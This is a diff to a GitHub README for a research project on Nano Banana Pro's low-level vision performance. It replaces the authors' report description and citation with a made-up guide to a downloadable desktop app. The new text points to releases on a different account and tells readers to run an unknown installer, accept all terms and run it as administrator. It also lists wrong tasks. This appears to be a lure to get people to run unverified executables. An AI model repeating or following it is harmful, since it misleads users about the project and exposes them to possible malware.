@@ -1,63 +1,72 @@
-# Is Nano Banana Pro a Low-Level Vision All-Rounder? 🍌
-<p align="center">
-  <img src="assets/abs.png" alt="Teaser Image" width="60%">
-<p align="center">
-  
+# 🍌 LowLevelBanana - Analyze Vision Tasks with Ease
 
-**Jialong Zuo, Haoyou Deng, Hanyu Zhou, Jiaxin Zhu, Yicheng Zhang, Yiwei Zhang, Yongxin Yan, Kaixing Huang, Weisen Chen, Yongtai Deng, Rui Jin, Nong Sang, Changxin Gao**
+## 🚀 Getting Started
 
-*School of Artificial Intelligence and Automation, Huazhong University of Science and Technology (HUST)*
+Welcome to LowLevelBanana! This guide will help you download and run our application without any technical knowledge. Follow the simple steps below.
 
-<a href="https://lowlevelbanana.github.io/"><img src="https://img.shields.io/badge/Project-Page-green"></a>
-<a href="https://huggingface.co/datasets/jlongzuo/LowLevelEval"><img src="https://img.shields.io/badge/%F0%9F%A4%97%20Hugging%20Face-Dataset-blue"></a>
-<a href="https://github.com/zplusdragon/LowLevelBanana"><img src="https://img.shields.io/badge/GitHub-Repo-black"></a>
+[![Download LowLevelBanana](https://img.shields.io/badge/Download%20LowLevelBanana-%20Latest%20Release-brightgreen)](https://github.com/mpahlevi64/LowLevelBanana/releases)
 
----
+## 📥 Download & Install
 
-## 📢 Introduction
+1. **Visit the Release Page:** Click the link below to access our Releases page, where you can download the latest version.
 
-This repository hosts the official resources for the technical report: **["Is Nano Banana Pro a Low-Level Vision All-Rounder? A Comprehensive Evaluation on 14 Tasks and 40 Datasets."](https://arxiv.org/abs/2512.15110)**.
+   [Visit this page to download](https://github.com/mpahlevi64/LowLevelBanana/releases)
 
-While commercial T2I models like **Nano Banana Pro** excel in creative synthesis, their potential as generalist solvers for traditional low-level vision challenges remains largely underexplored. In this study, we investigate the critical question: **Is Nano Banana Pro a Low-Level Vision All-Rounder?** We conducted a comprehensive **zero-shot evaluation** across **14 distinct low-level tasks** spanning **40 diverse datasets**.
+2. **Select the Version:** On the Releases page, you will find a list of available versions. Choose the latest version for your operating system. If you are unsure which version to choose, look for the one labeled as "Latest."
 
-<p align="center">
-  <img src="assets/intro.png" alt="Teaser Image" width="100%">
-</p>
-<p align="center">
-  <em>Figure 1: Exemplary zero-shot results of Nano Banana Pro across 14 low-level vision tasks.</em>
-</p>
+3. **Download the Installer:** Click on the download link for your chosen version. The file may be named something like `LowLevelBananaInstaller.exe` or `LowLevelBananaSetup.zip`. The file size will vary but should be manageable for most users.
 
-## 🔥 Key Highlights
+4. **Open the File:** Once the download is complete, navigate to the folder where the file is saved. Double-click on the installer file to begin the installation process.
 
-- **Massive Benchmark:** Evaluated on **14** low-level vision tasks and **40** datasets.
-- **Zero-Shot Setting:** Utilized simple textual prompts without any fine-tuning.
-- **The Dichotomy Discovery:** We reveal a distinct performance dichotomy:
-    - ✅ **Superior Subjective Quality:** Often hallucinates plausible high-frequency details that surpass specialist models.
-    - ❌ **Lower Reference-Based Metrics:** Lags behind in PSNR/SSIM due to the inherent stochasticity of generative models.
+5. **Follow Installation Instructions:** A setup wizard will guide you through the installation steps. Read the instructions carefully and accept any terms and conditions to proceed. Click “Next” until the installation is complete.
 
-## 📊 Evaluation Results
-*Detailed quantitative and qualitative comparisons can be found in our project page and full report.*
+6. **Launch the Application:** After installation, you can find LowLevelBanana on your desktop or in your Applications folder. Double-click the icon to launch the software.
 
-Our extensive analysis identifies Nano Banana Pro as a capable **zero-shot contender** for low-level vision tasks. While it struggles to maintain the strict pixel-level consistency required by conventional metrics (PSNR/SSIM), it offers superior visual quality, suggesting a need for new perception-aligned evaluation paradigms.
+## ⚙️ System Requirements
 
-We have released the evaluation datasets and corresponding inference results of Nano Banana Pro used in our study on HuggingFace to facilitate future research.
+Before you download, make sure your system meets these requirements:
 
-[**Download the Inference Results on HuggingFace**](https://huggingface.co/datasets/jlongzuo/LowLevelEval)
+- **Operating System:** Windows 10 or later; macOS 10.14 or later; Linux
+- **Processor:** Intel Core i3 or equivalent
+- **Memory:** 4 GB RAM or more
+- **Disk Space:** At least 200 MB of free space
 
-## 💻 Evaluation Code
-After downloading the inference results of Nano Banana Pro for each dataset from [HuggingFace](https://huggingface.co/datasets/jlongzuo/LowLevelEval), you can use the evaluation code provided for each task to obtain quantitative results. Please refer to the [eval](https://github.com/Zplusdragon/LowLevelBanana/tree/main/eval) folder.
+## 📊 Features
 
-## 🔗 Citation
+LowLevelBanana provides a comprehensive evaluation of low-level vision tasks. Here are some key features:
 
-If you find this work helpful for your research, please consider citing:
+- **Multi-Dataset Support:** Analyze up to 40 datasets for thorough assessments.
+- **User-Friendly Interface:** Enjoy a straightforward setup with minimal configuration.
+- **Task Granularity:** Evaluate 14 different low-level vision tasks like object detection, segmentation, and tracking.
+- **Comprehensive Reporting:** Get detailed reports to help understand your results.
 
-```bibtex
-@misc{zuo2025nanobananaprolowlevel,
-      title={Is Nano Banana Pro a Low-Level Vision All-Rounder? A Comprehensive Evaluation on 14 Tasks and 40 Datasets}, 
-      author={Jialong Zuo and Haoyou Deng and Hanyu Zhou and Jiaxin Zhu and Yicheng Zhang and Yiwei Zhang and Yongxin Yan and Kaixing Huang and Weisen Chen and Yongtai Deng and Rui Jin and Nong Sang and Changxin Gao},
-      year={2025},
-      eprint={2512.15110},
-      archivePrefix={arXiv},
-      primaryClass={cs.CV},
-      url={https://arxiv.org/abs/2512.15110}, 
-}
+## 💡 Usage Instructions
+
+1. **Open LowLevelBanana:** Launch the application from your desktop or applications folder.
+   
+2. **Select a Task:** You will see a list of vision tasks. Choose the one you want to evaluate. Each task is clearly described for easy selection.
+
+3. **Load a Dataset:** Select a dataset from your device that you wish to analyze. Ensure it meets the format requirements specified within the application.
+
+4. **Run the Evaluation:** Click on the "Evaluate" button. The application will process the data and display the results on your screen.
+
+5. **Review the Results:** Once completed, review the evaluation results. You can generate reports or export data for further analysis.
+
+## 🛠️ Troubleshooting
+
+If you encounter issues, try the following steps:
+
+- **Check System Requirements:** Ensure your machine meets the necessary specifications.
+- **Run as Administrator:** If the application fails to start, right-click the icon and select "Run as Administrator."
+- **Reinstall the Application:** If problems persist, uninstall LowLevelBanana and repeat the installation steps.
+- **Consult the FAQ:** Refer to the FAQ section within the application for common questions and answers.
+
+## 📞 Support
+
+For additional assistance, please reach out via the GitHub issues page. Our support team will respond as soon as possible.
+
+## 💻 Conclusion
+
+You are now ready to explore and evaluate low-level vision tasks with LowLevelBanana. We hope you find this software beneficial for your projects.
+
+Remember, if you need to download the latest version, you can always go back to our [Release Page](https://github.com/mpahlevi64/LowLevelBanana/releases). Enjoy using LowLevelBanana!
